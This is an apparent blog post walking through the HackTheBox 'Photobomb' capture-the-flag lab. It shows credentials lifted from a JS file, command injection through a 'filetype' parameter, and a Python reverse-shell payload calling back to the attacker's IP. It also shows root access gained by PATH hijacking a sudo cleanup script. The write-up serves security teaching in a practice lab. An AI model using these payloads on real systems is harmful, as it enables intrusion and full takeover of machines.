@@ -1,0 +1,195 @@
+---
+title: Hackthebox Photobomb Writeup
+slug: hackthebox-photobomb-writeup
+description: Hackthebox released a new machine called photobomb. On this machine, we got the web server where there is a JS file where we get the username and password to access the protected route, then abuse the filetype parameter to get a rev shell as photobomb and for Privilege Escalation using path traverse to get a root shell.
+date: 2022-10-10
+image: hackthebox-photobomb-writeup.webp
+---
+
+import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
+import { components as MDXComponents } from '../../components/mdxComponents';
+export const components = MDXComponents;
+
+## Nmap
+
+```js
+❯ nmap -sC -sV -oA nmap/result 10.10.11.182
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-10 15:17 IST
+Nmap scan report for 10.10.11.182
+Host is up (0.085s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
+|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
+|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://photobomb.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.68 seconds
+```
+
+Nmap tell us there are two open ports `22 ssh` and `80 http` and HTTP port redirect us to `http://photobomb.htb/`
+
+Let's quickly add this in our `/etc/hosts` file
+
+```js
+❯ cat /etc/hosts
+127.0.0.1       localhost examzy.com
+255.255.255.255 broadcasthost
+::1             localhost
+10.10.11.182    photobomb.htb
+```
+
+## Port-80
+
+There is a simple `HTML` page with a link which going to `/printer` but it's asking for `password` that's we don't know
+
+<FixTheImageURL src='web.png' slug='hackthebox-photobomb-writeup' />
+
+<FixTheImageURL src='web1.png' slug='hackthebox-photobomb-writeup' />
+
+After that, I view the source code of the website that's include the JS file called `photobomb.js`
+
+<FixTheImageURL src='web2.png' slug='hackthebox-photobomb-writeup' />
+
+Viewing that file, we got the `username` and `password`
+
+<FixTheImageURL src='web3.png' slug='hackthebox-photobomb-writeup' />
+
+Now let's try to log in with that `username` and `password`
+
+```js
+username = pH0t0
+password = b0Mb!
+```
+
+After login, we see that there is an option to `download` photo to print
+
+<FixTheImageURL src='web4.png' slug='hackthebox-photobomb-writeup' />
+
+I capture that request in `burp` and try some `command injection` in all parameters
+
+I try the payload in all `parameter` because I don't know in which parameter there will be `command injection`
+
+But before that start your `python web server`
+
+```js
+> python3 -m http.server 80
+```
+
+<FixTheImageURL src='burp.png' slug='hackthebox-photobomb-writeup' />
+
+This conforms that `photo` and `dimensions` parameter is not vulnerable
+
+<FixTheImageURL src='burp1.png' slug='hackthebox-photobomb-writeup' />
+
+## Command Injection
+
+Let's try with `file` type parameter
+
+```js
+photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;curl+10.10.XX.XX/dedsec&dimensions=3000x2000
+```
+
+<FixTheImageURL src='burp2.png' slug='hackthebox-photobomb-writeup' />
+
+And we got the hit, it's mean we can get `rev shell` with that
+
+<FixTheImageURL src='cmd.png' slug='hackthebox-photobomb-writeup' />
+
+## RCE
+
+I try `bash` payload, but that didn't work, so let's try `python` one
+
+```js
+photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png%3bexport+RHOST%3d"10.10.XX.XX"%3bexport+RPORT%3d9001%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'&dimensions=3000x2000
+```
+
+Before that, start your `net cat` listener
+
+```js
+> nc -nvlp 9001
+```
+
+It's hanging that `good sign`, let's check the net cat
+
+<FixTheImageURL src='burp3.png' slug='hackthebox-photobomb-writeup' />
+
+Boom 🎉 we got the shell as `wizard` user
+
+<FixTheImageURL src='cmd1.png' slug='hackthebox-photobomb-writeup' />
+
+Got the `user.txt`
+
+```js
+wizard@photobomb:~/photobomb$ cd ~
+cd ~
+wizard@photobomb:~$ cat user.txt
+cat user.txt
+4af8270c5c6ddff5d13ccb3ee2d7193a
+```
+
+## Privilege Escalation
+
+Before running `linpeas` let's try with `sudo -l`
+
+And we can see there is `cleanup.sh` script which we can run with `sudo` privilege
+
+```js
+wizard@photobomb:~$ sudo -l
+sudo -l
+Matching Defaults entries for wizard on photobomb:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+```
+
+And the content of the script is `straight forward`, it's just taking the log file and move their content into `photobomb.log.old` and then use truncate to clear `photobomb.log` to 0 byte
+
+but if you see `clearly` it's not using `absolute path` like cd, find we can take advantage of that and `traverse the path` of that `binaries`
+
+```js
+wizard@photobomb:~$ cat /opt/cleanup.sh
+cat /opt/cleanup.sh
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log > log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+```
+
+Just add `/bin/bash` in cd file and give read, write, execute permission
+
+I also create find file because if one failed we have `backup` to get shell as `root`
+
+Now just run that file with `sudo` permission and set the `PATH` to `/temp` directory
+
+```js
+wizard@photobomb:~$ echo "/bin/bash" > /tmp/cd
+echo "/bin/bash" > /tmp/cd
+wizard@photobomb:~$ echo "/bin/bash" > /tmp/find
+echo "/bin/bash" > /tmp/find
+wizard@photobomb:~$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
+sudo PATH=/tmp:$PATH /opt/cleanup.sh
+root@photobomb:/home/wizard/photobomb# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@photobomb:/home/wizard/photobomb# cat /root/root.txt
+cat /root/root.txt
+0777d5279a599ddc20bb5edf5253d8b6
+```
